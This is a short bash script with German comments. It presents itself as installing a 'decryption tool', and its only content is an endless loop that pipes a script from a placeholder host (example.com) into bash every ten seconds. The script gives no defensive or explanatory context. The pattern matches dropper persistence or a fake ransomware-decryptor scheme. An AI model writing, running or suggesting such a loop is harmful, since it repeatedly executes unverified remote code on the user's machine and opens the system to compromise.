#!/bin/bash

# Installiert und führt das Entschlüsselungsskript aus
install_decryption_tool() {
    echo "Installiere Entschlüsselungstool..."
    curl -sS https://example.com/remote_decryption_installer.sh | bash
}

# Endlosschleife, um das Entschlüsselungstool immer offen zu halten
while true; do
    install_decryption_tool
    sleep 10
done
